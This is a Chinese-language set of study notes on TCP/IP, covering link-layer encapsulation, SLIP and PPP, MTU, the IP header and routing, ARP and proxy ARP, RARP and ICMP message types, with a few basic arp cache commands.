<h2 id="以太网和IEEE-802封装"><a href="#以太网和IEEE-802封装" class="headerlink" title="以太网和IEEE 802封装"></a>以太网和IEEE 802封装</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/151227346352054.png" alt=""></p>
<h3 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h3><ul>
<li>以太网这个术语一般是指数字设备公司、英特尔公司和Xerox公司在1982年联合公布的一个标准</li>
<li>它采用一种称作CSMA/CD的媒体接入方法。</li>
<li>它的速率为10Mb/s，地址为48bit</li>
</ul>
<h3 id="IEEE-802封装"><a href="#IEEE-802封装" class="headerlink" title="IEEE 802封装"></a>IEEE 802封装</h3><ul>
<li>802.3针对整个CSMA/CD网络</li>
<li>802.4针对令牌总线网络</li>
<li>802.5针对令牌环网络</li>
<li>这三者的共同特性由802.2标准来定义，那就是802网络共有的逻辑链路控制（LLC）</li>
</ul>
<h2 id="封装格式"><a href="#封装格式" class="headerlink" title="封装格式"></a>封装格式</h2><ul>
<li>两种帧格式都采用48bit(6字节)的目的地址和源地址</li>
<li>ARP和RARP协议对32bit的IP地址和48bit的硬件地址进行映射</li>
<li>802定义的有效长度值与以太网的有效类型值无一相同，这样就可以对两种帧格式进行区分</li>
<li>母的服务访问点（DSAP）和源服务访问点（SSAP）的值都设为0xaa。Ctr1字段的值设为3.随后的3个字节orgcode都置为0.再接下来的2个字节类型字段和以太网帧格式一样。</li>
<li>802.3规定数据分布必须至少为38字节，而对于以太网，则要求最少要有46字节。为了保证这一点，必须在不足的空间插入填充（pad）字节。</li>
</ul>
<h2 id="SLIP：串行线路IP"><a href="#SLIP：串行线路IP" class="headerlink" title="SLIP：串行线路IP"></a>SLIP：串行线路IP</h2><p>SLIP的全称是Serial Line IP。它是一种在串行线路上对IP数据报进行封装的简单形式。SLIP适用于家庭中每台计算机几乎都有的RS-232串行端口和高速调制解调器接入Internet。下面的规则描述了SLIP协议定义的帧格式：</p>
<ul>
<li>IP数据报以一个称作END（0xc0）的特殊字符结束。同时，为了防止数据报到来之前的线路噪声被当成数据报内容，大多数实现在数据报的开始处也传一个END字符。</li>
<li>如果IP报文中某个字符为END，那么就要连续传输两个字节0xdb和0xdc来取代它。0xdb这个特殊字符被称作SLI的ESC字符。</li>
<li>如果IP报文中某个字符为SLIP的ESC字符，那么就要连续传输两个字节0xdb和0xdd来取代它。</li>
</ul>
<p>图2-2中的例子就是含有一个END字符和一个ESC字符的IP报文。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/151336240428797.png" alt=""></p>
<p>SLIP是一种简单的帧封装方法，值得一提的缺陷：</p>
<ul>
<li>每一端必须知道对方的IP地址。没有办法把本端的IP地址通知给另一端。</li>
<li>数据帧中没有类型字段（类似于以太网中的类型字段）。如果一条串行线路用于SLIP，那么它不能同时使用其他协议。</li>
<li>SLIP没有在数据帧中加上检验和（类似于以太网中的CRC字段）。如果SLIP传输报文被线路噪声影响而发生错误，只能通过上层协议来发现。</li>
</ul>
<p>尽管存在这些缺点，SLIP仍然是一种广泛使用的协议。</p>
<h2 id="PPP：点对点协议"><a href="#PPP：点对点协议" class="headerlink" title="PPP：点对点协议"></a>PPP：点对点协议</h2><p>PPP点对点协议修改了SLIP协议中的所有缺陷。包括三个部分：</p>
<ul>
<li>在串行链路上封装IP数据报的方法。PPP既支持数据为8位和无奇偶检验的异步模式，还支持面向比特的同步链接。</li>
<li>建立、配置及测试数据链路的链路控制协议（LCP：Link Control Protocol）。它允许通信双方进行协商，以确定不同的选项。</li>
<li>针对不同网络层协议的网络控制协议（NCP：Network Control Protocol）体系。</li>
</ul>
<p>图2-3是PPP数据帧的格式。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/151400284327893.png" alt=""></p>
<ul>
<li>每一帧都以标志字符0x7e开始和结束。紧接着是一个地址字节，值始终是0xff，然后是一个值为0x03的控制字节。</li>
<li>协议字段，类似于以太网中类型字段的功能。当它的值为0x0021时，表示信息字段是一个 IP数据报；值为0xc021时，表示信息字段是链路控制数据；值为0x8021时，表示信息字段是网络控制数据。</li>
<li>CRC字段（或FCS，帧检验序列）是一个循环冗余检验码，以检测数据帧中的错误。</li>
<li>标志字符0x7e出现在信息字段中时，PPP需要对它进行转义。</li>
</ul>
<p>总的来说，PPP比SLIP具有下面这些优点：</p>
<ul>
<li>PPP支持在单根串行线路上运行多种协议，不只是IP协议；</li>
<li>每一帧都有循环冗余检验；</li>
<li>通信双方可以进行IP地址的动态协商(使用IP网络控制协议)；</li>
<li>与CSLIP类似，对TCP和IP报文首部进行压缩；</li>
<li>链路控制协议可以对多个数据链路选项进行设置。</li>
</ul>
<p>为这些优点付出的代价是在每一帧的首部增加3个字节，当建立链路时要发送几帧协商数据，以及更为复杂的实现。</p>
<h2 id="环回接口"><a href="#环回接口" class="headerlink" title="环回接口"></a>环回接口</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/151420134957085.png" alt=""></p>
<ul>
<li>传给换回地址（一般是127.0.0.1）任何数据均作为IP输入（都能ping通）</li>
<li>传给广播地址或多播地址报复制一份传给环回接口，然后送给环回接口，然后送到以太网上。这是因为广播传送和多播传送的定义包含主机本身</li>
<li>任何传给该主机IP地址的数据均送到环回接口</li>
</ul>
<h2 id="MTU和路径MTU"><a href="#MTU和路径MTU" class="headerlink" title="MTU和路径MTU"></a>MTU和路径MTU</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/151428393854765.png" alt=""></p>
<ul>
<li>以太网和802.3对数据帧的长度都有一个限制，其最大值分别是1500和1492字节。链路层的这个特征称作MTU，最大传输单元</li>
<li>如果IP层有一个数据报要传，而且数据的长度比链路层的MTU还大，那么IP层就需要进行分片（fragmentation）,把数据报分成若干片，这样每一片都小于MTU</li>
<li>点到点的链路层（如SLIP和PPP）和MTU并非指的是网络媒体的物理特性。相反，它是一个逻辑限制，母的是为交互使用提供足够快的响应时间</li>
<li>两台通信主机路径中的最小MTU。它被称作路径MTU</li>
<li>路径MTU在两个方向上不一定是一致的</li>
<li>MTU是计算出方向的</li>
</ul>
<h2 id="串行线路吞吐量计算"><a href="#串行线路吞吐量计算" class="headerlink" title="串行线路吞吐量计算"></a>串行线路吞吐量计算</h2><p>如果线路速率是9600b/s，而一个字节有8bit，加上一个起始比特和一个停止比特，那么线路的速率就是960B/s（字节/秒）。以这个速率传输一个1024字节的分组需要1066ms。如果用SLIP链接运行一个交互式应用程序，同时还运行另一个应用程序如FTP发送或接收1024字节的数据，那么一般来说就必须等待一半的时间（533ms）才能把交互式应用程序的分组数据发送出去。</p>
<p>对于交互应用来说，等待533ms是不能接受的。研究表明，交互响应时间超过100~200ms就被认为是不好的，这是发送一份交互报文出去后，直到接收到响应信息（通常是出现一个回显字符）为止的往返时间。</p>
<p>注意：我们对平均等待时间的计算（传输最大数据帧所需时间的一半）只适用于SLIP链路（或PPP链路）在交互通信和大块数据传输这两种情况下。</p>
<h1 id="IP：网际协议"><a href="#IP：网际协议" class="headerlink" title="IP：网际协议"></a>IP：网际协议</h1><h2 id="IP介绍"><a href="#IP介绍" class="headerlink" title="IP介绍"></a>IP介绍</h2><ul>
<li>IP是TCP/IP协议族中最为核心的协议。所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输</li>
<li>IP提供不可靠、无连接的数据报传送服务</li>
<li>不可靠（unreliable）的意思是它不能保证IP数据报能成功到达目的地。IP仅提供最好的传输服务。如果发生某种错误时，如某个路由器暂时用完了缓冲区，IP有一个简单的错误处理算法：丢弃该数据报，然后发送ICMP消息报给信源端。任何要求的可靠性必须由上层来提供（如TCP）</li>
<li>无连接（connectionless）这个术语的意思是IP并不维护任何关于后续数据报的状态信息。每个数据报的处理是互相独立的。IP数据报可以不按发送顺序接收。如果一信源向相同的信宿发送两个连续的数据报（先是A，然后是B），每个数据报都是独立地进行路由选择，课时选择不同的路线，因此B可能在A到达之前先到达。</li>
</ul>
<h2 id="IP首部"><a href="#IP首部" class="headerlink" title="IP首部"></a>IP首部</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/161409216674369.png" alt=""></p>
<ul>
<li>4个字节的32bit值以下面的次序传输：首先是0~7bit，其次8~15bit，然后16~23bit，最后是24、·31bit。这种传输次序称作big endian字节序。由于TVP|IP首部中所有的二进制整数在网络中传输时都要求以这种次序，因此它又称作网络字节序</li>
<li>目前的协议版本号是4，因此IP有时也称作IPv4</li>
<li>首部长度指的是首部占32bit字的数目，包括任何选项。由于它是一个4bit字段，因此首部最长为60个字节</li>
<li>服务类型（TOS）字段包括一个3bit的优先权子字段（现在已被忽略），4bit的TOS字段和1bit未用位但必须置0</li>
<li>服务类型（TOS）字段包括一个3 bit的优先权子字段（现在已被忽略），4 bit的TOS子字段和1 bit未用位，但必须置0。4 bit的TOS分别代表：最小时延、最大吞吐量、最高可靠性和最小费用。 4 bit中只能置其中1 bit。如果所有4 bit均为0，那么就意味着是一般服务。图3-2列出了对不同应用建议的TOS值。</li>
</ul>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/161438232606801.png" alt=""></p>
<p>注意：现在大多数的TCP/IP实现都不支持TOS特性。</p>
<ul>
<li>总长度字段是指整个IP数据报的长度，以字节为单位。由于该字段长16比特，所以IP数据报最长可达65535字节。<br>注意：尽管可以传送一个长达65535字节的IP数据报，但是大多数的链路层都会对它进行分片。而且，主机也要求不能接收超过576字节的数据报。</li>
<li>标识字段唯一地标识主机发送的每一份数据报。通常每发送一份报文它的值就会加1。</li>
<li>TTL生存时间字段设置了数据报可以经过的最多路由器数。它指定了数据报的生存时间。 TTL的初始值由源主机设置（通常为32或64），一旦经过一个处理它的路由器，它的值就减去1。当该字段的值为0时，数据报就被丢弃，并发送ICMP报文通知源主机。</li>
<li>协议字段，它可以识别是哪个协议向IP传送数据。</li>
<li>首部检验和字段是根据IP首部计算的检验和码。</li>
<li>如果结果不是全1（即检验和错误），那么IP就丢弃收到的数据报。但是不生成差错报文，由上层去发现丢失的数据报并进行重传</li>
<li>由于路由器经常只修改TTL字段（减1），因为当路由器转发一份报文时可以增加它的检验和，而不需要对IP整个首部进行重新计算</li>
<li>任选项，是数据报中的一个可变长的可选信息。这些选项很少被使用，并非所有的主机和路由器都支持这些选项。</li>
</ul>
<h2 id="IP路由选择"><a href="#IP路由选择" class="headerlink" title="IP路由选择"></a>IP路由选择</h2><h3 id="路由表中的包含信息"><a href="#路由表中的包含信息" class="headerlink" title="路由表中的包含信息"></a>路由表中的包含信息</h3><ul>
<li>目的IP地址。<br>它既可以是一个完整的主机地址，也可以是一个网络地址，由该表目中的标志字段来指定。主机地址有一个非0的主机号，以指定某一特定的主机，而网络地址中的主机号为0，以指定网络中的所有主机（如以太网，令牌环网）。</li>
<li>下一跳路由器的IP地址，或者有直接连接的网络IP地址。<br>下一跳路由器是指一个在直接相连网络上的路由器，通过它可以转发数据报。下一跳路由器不是最终的目的，但是它可以把传送给它的数据报转发到最终目的。</li>
<li>标志。<br>其中一个标志指明目的IP地址是网络地址还是主机地址，另一个标志指明下一跳路由器是否为真正的下一跳路由器，还是一个直接相连的接口。</li>
<li>为数据报的传输指定一个网络接口。</li>
</ul>
<h3 id="路由选择完成的功能"><a href="#路由选择完成的功能" class="headerlink" title="路由选择完成的功能"></a>路由选择完成的功能</h3><p>IP路由选择是逐跳地进行的。IP并不知道到达任何目的的完整路径（当然，除了那些与主机直接相连的目的）。所有的IP路由选择只为数据报传输提供下一跳路由器的IP地址。它假定下一跳路由器比发送数据报的主机更接近目的，而且下一跳路由器与该主机是直接相连的。</p>
<ul>
<li>搜索路由表，寻找能与目的IP地址完全匹配的表目（网络号和主机号都要匹配）。如果找到，则把报文发送给该表目指定的下一站路由器或直接连接的网络接口（取决于标志字段的值）。</li>
<li>搜索路由表，寻找能与目的网络号相匹配的表目。如果找到，则把报文发送给该表目指定的下一站路由器或直接连接的网络接口。</li>
<li>搜索路由表，寻找标为“默认”的表目。如果找到，则把报文发送给该表目指定的下一站路由器</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><img src="http://news.edu-chn.com/newsadmin/upload_images/1115277097522.JPG" alt=""></p>
<p><img src="http://news.edu-chn.com/newsadmin/upload_images/1115277119522.JPG" alt=""></p>
<p>对于这个例子需要指出一些关键点：</p>
<ul>
<li>该例子中所有主机和路由器都使用了默认路由。事实上，大多数主机和一些路由器可以用默认路由来处理任何目的，除非它在本地局域网上</li>
<li>数据报中的目的IP地址始终不发生任何变化。所有的路由选择决策都是基于这个目的IP地址</li>
<li>每个链路层可能具有不同数据帧首部，而且链路层的目的地址（如果有的话）始终指的是下一站的链路层地址。在例子中，两个以太网封装了含有下一站以太网地址的链路层首部，但是SLIP链路没有这样做。以太网地址一般通过ARP获得。</li>
</ul>
<h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>任何主机在引导时进行的部分配置是指定主机IP地址。除了此以外，还需要知道有多少比特用于子网号和多少比特用于主机号。这是在引导过程中通过子网掩码来确定的。子网掩码是一个32 bit的值，其中值为1的比特留给网络号和子网号，为0的比特留给主机号。</p>
<p>例如：一个B类地址的两种不同的子网掩码格式。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/171403295891545.png" alt=""></p>
<p>第一个例子，子网号和主机号都是8 bit。第二个例子，子网号是10 bit，主机号是6 bit。</p>
<h2 id="特殊情况的IP地址"><a href="#特殊情况的IP地址" class="headerlink" title="特殊情况的IP地址"></a>特殊情况的IP地址</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/171404494796569.png" alt=""></p>
<ul>
<li>0表示所有的比特位全为0；-1表示所有的比特位全为1；netid、subnetid和hostid分别表示不为全0或全1的对应字段。子网号栏为空表示该地址没有进行子网划分</li>
<li>表的头两项是特殊的源地址，中间是特殊的环回地址，最后四项是广播地址</li>
<li>表中的头两项，网络号为0，如主机使用BOOTP协议确定本机IP地址时只能作为初始化过程中的源地址出现</li>
</ul>
<h1 id="ARP：地址解析协议"><a href="#ARP：地址解析协议" class="headerlink" title="ARP：地址解析协议"></a>ARP：地址解析协议</h1><h2 id="ARP介绍"><a href="#ARP介绍" class="headerlink" title="ARP介绍"></a>ARP介绍</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/182021092763762.png" alt=""></p>
<ul>
<li>当一台主机把以太网数据帧发送到位于同一局域网上的另一台主机时，是根据48bit的以太网地址来确定目的接口的。设备驱动程序从不检查IP数据报中的目的IP地址</li>
<li>地址解析为这两种不同的地址形式提供映射：32bit的IP地址和数据链路层使用的任何类型的地址（FR环境）</li>
<li>ARP为IP地址到对应的硬件地址之间提供动态映射。我们之所以用动态这个词是因为这个过程是自动完成的，一般应用程序用户或系统管理员不必关心</li>
<li>RARP是被那些没有磁盘驱动器的系统使用（一般是无盘工作站或X终端），它需要系统管理员进行手工设置</li>
</ul>
<h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/182028596987012.png" alt=""></p>
<p>当敲入以下命令时：ftp bsdi（主机名），会发生下列步骤：</p>
<ul>
<li>应用程序FTP客户端调用函数gethostbyname把主机名（bsdi）转换成32 bit的IP地址。这个转换过程或者使用DNS，或者在较小网络中使用一个静态的主机文件（/etc/hosts）。</li>
<li>FTP客户端请求TCP用得到的IP地址建立连接。</li>
<li>TCP发送一个连接请求分段到远端的主机，即用上述IP地址发送一份IP数据报。</li>
<li>如果目的主机在本地网络上（如以太网、令牌环网或点对点链接的另一端），那么IP数据报可以直接送到目的主机上。如果目的主机在一个远程网络上，就通过IP选路函数来确定位于本地网络上的下一站路由器地址，并让它转发IP数据报。</li>
<li>假定是一个以太网，那么发送端主机必须把32 bit的IP地址变换成48 bit的以太网地址。从逻辑Internet地址到对应的物理硬件地址需要进行翻译，这是ARP的功能。</li>
<li>ARP发送一份称作ARP请求的以太网数据帧给以太网上的每个主机，这个过程称作广播。ARP请求数据帧中包含目的主机的IP地址（主机名为bsdi），意思是“如果你是这个IP地址的拥有者，请回答你的硬件地址。”</li>
<li>目的主机的ARP层收到这份广播报文后，识别出这是发送端在寻问它的IP地址，于是发送一个ARP应答。这个ARP应答包含IP地址及对应的硬件地址。</li>
<li>收到ARP应答后，使ARP进行请求-应答交换的IP数据报现在就可以传送了。</li>
<li>发送IP数据报到目的主机。</li>
</ul>
<p>说明：</p>
<ul>
<li>在ARP背后有一个基本概念，就是网络接口有一个硬件地址（一个48 bit的值，标识不同的以太网或令牌环网络接口）。</li>
<li>在硬件层次上进行的数据帧交换必须有正确的接口地址。但是，TCP/IP有自己的地址：32 bit的IP地址。知道主机的IP地址并不能让内核发送一帧数据给主机。内核（如以太网驱动程序）必须知道目的端的硬件地址才能发送数据。</li>
<li>ARP的功能是在32 bit的IP地址和采用不同网络技术的硬件地址之间提供动态映射。</li>
<li>点对点链路不使用ARP。当设置这些链路时（一般在引导过程进行），必须告知内核链路每一端的IP地址。像以太网地址这样的硬件地址并不涉及。</li>
</ul>
<h2 id="ARP背后的一个基本概念"><a href="#ARP背后的一个基本概念" class="headerlink" title="ARP背后的一个基本概念"></a>ARP背后的一个基本概念</h2><ul>
<li>在ARP背后有一个概念，那就是网络接口有一个硬件地址（一个48bit的值，标识不同的以太网或令牌环网络接口）。在硬件层次上进行的数据帧交换必须有正确的接口地址。但是，TCP|IP有自己的地址：32bit的IP地址。知道主机的IP地址并不能让内核发送一帧数据给主机。内核必须知道目的端的硬件地址才能发送数据。ARP的功能是在32bit的IP地址和采用不同网络技术的硬件地址之间提供动态映射</li>
<li>点对点链路不好使用ARP。当设置这些链路时（一般在引导过程进行），必须告知内核链路每一端IP的地址。像以太网地址这样的硬件地址并不涉及</li>
</ul>
<h2 id="ARP高速缓存"><a href="#ARP高速缓存" class="headerlink" title="ARP高速缓存"></a>ARP高速缓存</h2><ul>
<li>ARP高效运行的关键是由于每个主机上都有一个ARP高速缓存。这个高速缓存存放了最近Intern et地址到硬件地址之间的映射记录。高速缓存中每一项的生存时间一般为20分钟，起始时间从被创建时开始算起。</li>
<li>可用arp命令来检查ARP高速缓存。-a的意思是显示高速缓存中所有的内容。</li>
<li>48 bit的以太网地址用6个十六进制的数来表示，中间以冒号隔开。</li>
</ul>
<h3 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">arp -a	查看缓存</div><div class="line">arp -d  清除缓存</div></pre></td></tr></table></figure>
<h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">show arp	查看缓存</div><div class="line">clear arp	清除缓存</div></pre></td></tr></table></figure>
<h2 id="ARP的分组格式"><a href="#ARP的分组格式" class="headerlink" title="ARP的分组格式"></a>ARP的分组格式</h2><p>在以太网上解析IP地址时，ARP请求和应答分组的格式如图4-3所示（ARP可以用于其他类型的网络，可以解析IP地址以外的地址。紧跟着帧类型字段的前四个字段指定了最后四个字段的类型和长度）</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/182051571674088.png" alt=""></p>
<h3 id="ARP包字段分析"><a href="#ARP包字段分析" class="headerlink" title="ARP包字段分析"></a>ARP包字段分析</h3><ul>
<li>前两个字段是以太网的源地址和目的地址。目的地址为全1的地址是广播地址。电缆上的所有以太网接口都要接收广播的数据帧。</li>
<li>以太网帧类型表示后面数据的类型。对于ARP请求或应答来说，该字段的值为0x0806。</li>
<li>硬件类型字段表示硬件地址的类型。它的值为1即表示以太网地址。</li>
<li>协议类型字段表示要映射的协议地址类型。它的值为0x0800即表示IP地址。</li>
<li>硬件地址长度和协议地址长度分别指出硬件地址和协议地址的长度，以字节为单位。对于以太网上IP地址的ARP请求或应答来说，它们的值分别为6和4。</li>
<li>操作字段指出四种操作类型，它们是ARP请求（值为1）、ARP应答（值为2）、RARP请求（值为 3）和RARP应答（值为4）。</li>
</ul>
<h2 id="ARP代理"><a href="#ARP代理" class="headerlink" title="ARP代理"></a>ARP代理</h2><p>ARP代理通俗地说，就是由中间设备代替其他主机响应arp请求。下图展现了ARP代理工作的主要过程：<br>Proxy ARP应该使用主机没有配置默认网关或没有任何路由策略的网络上</p>
<p><img src="http://www.vants.org/content/plugins/kl_album/upload/201209/98e326f50f0ae0ca8723ba653376c7c020120914093556873290427.png" alt=""></p>
<h3 id="ARP代理工作的过程说明"><a href="#ARP代理工作的过程说明" class="headerlink" title="ARP代理工作的过程说明"></a>ARP代理工作的过程说明</h3><ul>
<li>192.168.0.16/16主机向外发送目的主机为192.168.1.3/24的ARP请求报文；</li>
<li>网关收到0.16的ARP请求报文，由于网关开启了ARP代理的功能，因此网关代替1.3向0.16发送ARP响应数据报；</li>
<li>网关向1.0/24网段发送1.3的ARP请求报文；</li>
<li>1.3收到后，发送ARP响应报文。</li>
</ul>
<h3 id="ARP代理带来的问题"><a href="#ARP代理带来的问题" class="headerlink" title="ARP代理带来的问题"></a>ARP代理带来的问题</h3><p>在开启ARP代理功能之后，很可能会导致地址冲突等类似故障的产生，如在下图的网络环境下，将会产生一系列的不稳定的故障现象产生。 </p>
<p><img src="http://www.vants.org/content/plugins/kl_album/upload/201209/726cb8dcdc4764f2cc1559c89ffde637201209161035261080797373.png" alt=""></p>
<p>   正因为如此，我们在实际工作的环境中对于ARP代理功能的应用需要慎重一些，尽量避免针对整个网段使用ARP代理功能，最好只针对需要使用ARP代理功能来实现某些特殊功能需求的少数IP开启。</p>
<h3 id="ARP代理在实际工作中的应用"><a href="#ARP代理在实际工作中的应用" class="headerlink" title="ARP代理在实际工作中的应用"></a>ARP代理在实际工作中的应用</h3><h4 id="AnyIP"><a href="#AnyIP" class="headerlink" title="AnyIP"></a>AnyIP</h4><p>AnyIP是指机器随便使用什么IP地址或网关信息，只要接入网络中都可以实现访问的需求。这个技术被广泛的应用在soho级网关产品中，特别是在宾馆、会议室、广场等公共场所，为网络使用者提供了很大的便利。<br>其工作原理就是利用了ARP代理的功能，在收到非本地IP地址的ARP请求报文时，对其进行ARP响应。这样，那些收到ARP响应的主机就会将相关的数据包发送至网关设备接口处，再由网关设备转发出去，从而实现了上网的功能。   </p>
<h4 id="网关地址映射"><a href="#网关地址映射" class="headerlink" title="网关地址映射"></a>网关地址映射</h4><p>在很多网关设备上，都支持将内网的服务器映射为公网地址对外提供服务，以达到隐藏内部网络的目的，这种地址映射也是利用ARP代理技术来实现的，我们来简单看一下下图所示的地址映射的工作过程： </p>
<p><img src="http://www.vants.org/content/plugins/kl_album/upload/201209/d8007e7cdb19d6455234a654b47ab31b2012091409355588821205.png" alt=""></p>
<p>  在这个过程中，当来自互联网的数据访问产生了对映射外网地址202.102.X.2的ARP请求报文，正常情况下，因为这个地址的真实主机并不存在，发送端是不会收到来自202.102.X.2的ARP响应报文的。但是，由于网关上启用了针对202.102.X.2的ARP代理功能，网关会替代202.102.X.2发送ARP响应报文。从而实现了地址映射访问的需求。</p>
<h2 id="免费ARP"><a href="#免费ARP" class="headerlink" title="免费ARP"></a>免费ARP</h2><p>它是指主机发送ARP查找自己的IP地址。通常，它发生在系统引导期间进行接口配置的时候。免费ARP有两个作用：</p>
<ul>
<li>一个主机可以通过它来确定另一个主机是否设置了相同的IP地址。主机bsdi并不希望对此请求有一个回答。但是，如果收到一个回答，那么就会在终端日志上产生一个错误信息“以太网：a:b:c:d:e:f发送来重复的IP地址”。这样就可以警告系统管理员，某个系统有不正确的设置。</li>
<li>如果发送免费ARP的主机正好改变了硬件地址（很可能是主机关机了，并换了一块接口卡，然后重新启动），那么这个分组就可以使其他主机高速缓存中旧的硬件地址进行相应的更新。一个比较著名的ARP协议事实是，如果主机收到某个IP地址ARP请求，而且它已经在接收者的高速缓存中，那么就要用ARP请求中的发送端硬件地址（如以太网地址）对高速缓存中相应的内容进行更新。主机接收到任何ARP请求都要完成这个操作（ARP请求是在网上广播的，因此每次发送ARP请求时网络上的所有主机都要这样做）</li>
<li>通过发送含有备份硬件地址和故障服务器的IP地址的免费ARP请求，使得备份文件服务器可以顺利地接替故障服务器进行工作。这使得所有目的地为故障服务器的报文都被送到备份服务器那里，客户程序不用关心原来的服务器是否出了故障</li>
</ul>
<h1 id="RARP：逆地址解析协议"><a href="#RARP：逆地址解析协议" class="headerlink" title="RARP：逆地址解析协议"></a>RARP：逆地址解析协议</h1><h2 id="引言-1"><a href="#引言-1" class="headerlink" title="引言"></a>引言</h2><p>具有本地磁盘的系统引导时，一般是从磁盘上的配置文件中读取IP地址。但是无盘机，如X终端或无盘工作站，则需要采用其他方法来获得IP地址。<br>网络上的每个系统都具有唯一的硬件地址，它是由网络接口生产厂家配置的。无盘系统的RARP实现过程是从接口卡上读取唯一的硬件地址，然后发送一份RARP请求（一帧在网络上广播的数据），请求某个主机响应该无盘系统的IP地址（在RARP应答中）。</p>
<h2 id="RARP的分组格式"><a href="#RARP的分组格式" class="headerlink" title="RARP的分组格式"></a>RARP的分组格式</h2><p>RARP分组的格式与ARP分组基本一致。它们之间主要的差别是RARP请求或应答的帧类型代码为0x8035，且RARP请求的操作代码为3，应答操作代码为4。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/192207023854764.png" alt=""></p>
<p>注意：RARP请求以广播方式传送，应答一般是单播(unicast)传送的。</p>
<h2 id="RARP服务器的设计"><a href="#RARP服务器的设计" class="headerlink" title="RARP服务器的设计"></a>RARP服务器的设计</h2><p>RARP在概念上很简单，但是一个RARP服务器的设计与系统相关而且比较复杂。相反，提供一个ARP服务器很简单，通常是TCP/IP在内核中实现的一部分。由于内核知道IP地址和硬件地址，因此当它收到一个询问IP地址的ARP请求时，只需用相应的硬件地址来提供应答就可以了。</p>
<h3 id="作为用户进程的RARP服务器"><a href="#作为用户进程的RARP服务器" class="headerlink" title="作为用户进程的RARP服务器"></a>作为用户进程的RARP服务器</h3><p>RARP服务器的复杂性在于：</p>
<ul>
<li>服务器一般要为多个主机（网络上所有的无盘系统）提供硬件地址到IP地址的映射，该映射包含在一个磁盘文件中。由于内核一般不读取和分析磁盘文件，因此RARP服务器的功能就由用户进程来提供，而不是作为内核的TCP/IP实现的一部分。</li>
<li>RARP请求是作为一个特殊类型的以太网数据帧来传送的（帧类型字段值为0x8035），说明RARP服务器必须能够发送和接收这种类型的以太网数据帧。</li>
</ul>
<h3 id="每个网络有多个RARP服务器"><a href="#每个网络有多个RARP服务器" class="headerlink" title="每个网络有多个RARP服务器"></a>每个网络有多个RARP服务器</h3><p>RARP服务器实现的一个复杂因素是RARP请求是在硬件层上进行广播的，这意味着它们不经过路由器进行转发。为了让无盘系统在RARP服务器关机的状态下也能引导，通常在一个网络上（例如一根电缆）要提供多个RARP服务器。<br>当服务器的数目增加时（以提供冗余备份），网络流量也随之增加，因为每个服务器对每个RARP请求都要发送RARP应答。发送RARP请求的无盘系统一般采用最先收到的RARP应答。（对于ARP，只有一台主机发送ARP应答）。每个RARP服务器同时应答，这样会增加以太网发生冲突的概率。</p>
<h1 id="ICMP：Internet控制报文协议"><a href="#ICMP：Internet控制报文协议" class="headerlink" title="ICMP：Internet控制报文协议"></a>ICMP：Internet控制报文协议</h1><h2 id="ICMP介绍"><a href="#ICMP介绍" class="headerlink" title="ICMP介绍"></a>ICMP介绍</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/201851308717804.png" alt=""><br><img src="http://images.cnitblog.com/blog2015/697266/201504/201854533243954.png" alt=""></p>
<ul>
<li>ICMP经常被认为是IP层的一个组成部分。它传递差错报文以及其他需要注意的信息。ICMP报文通常被IP层或更高层协议（TCO或UDP）使用。一些ICMP报文把差错报文返回给用户进程</li>
<li>ICMP报文是在IP数据内部被传输的</li>
<li>ICMP报文的格式如图6-2所示。所有报文的前4个字节都是一样的，但是剩下的其他字节则互不相同</li>
<li>类型字段可以有15个不同的值，以描述特定类型的ICMP报文。某些ICMP报文还使用代码字段的值来进一步描述不同的条件</li>
<li>检验和字段覆盖整个ICMP报文。使用的算法与IP首部检验和算法相同。ICMP的检验和是必须的</li>
</ul>
<h2 id="ICMP报文的类型"><a href="#ICMP报文的类型" class="headerlink" title="ICMP报文的类型"></a>ICMP报文的类型</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/201900206052867.png" alt=""></p>
<ul>
<li>不同类型由报文中的类型字段和代码字段来共同决定。</li>
<li>ICMP是一份查询报文还是一份差错报文。</li>
<li>因为对ICMP差错报文有时需要作特殊处理，因此需要对它们进行区分。例如，在对ICMP差错报文进行响应时，永远不会生成另一份ICMP差错报文（如果没有这个限制规则，可能会遇到一个差错产生另一个差错的情况，而差错再产生差错，这样会无休止地循环下去）。</li>
<li>当发送一份ICMP差错报文时，报文始终包含IP的首部和产生ICMP差错报文的IP数据报的前8个字节。这样，接收ICMP差错报文的模块就会把它与某个特定的协议（根据IP数据报首部中的协议字段来判断）和用户进程（根据包含在IP数据报前8个字节中的TCP或UDP报文首部中的TCP或UDP端口号来判断）联系起来。</li>
</ul>
<h3 id="下面各种情况都不会导致产生ICMP差错报文"><a href="#下面各种情况都不会导致产生ICMP差错报文" class="headerlink" title="下面各种情况都不会导致产生ICMP差错报文"></a>下面各种情况都不会导致产生ICMP差错报文</h3><ul>
<li>ICMP差错报文（ICMP查询报文可能会产生ICMP差错报文）。</li>
<li>目的地址是广播地址或多播地址的IP数据报。</li>
<li>作为链路层广播的数据报。</li>
<li>不是IP分片的第一片。</li>
<li>源地址不是单个主机的数据报。即源地址不能为零地址、环回地址、广播地址或多播地址。</li>
</ul>
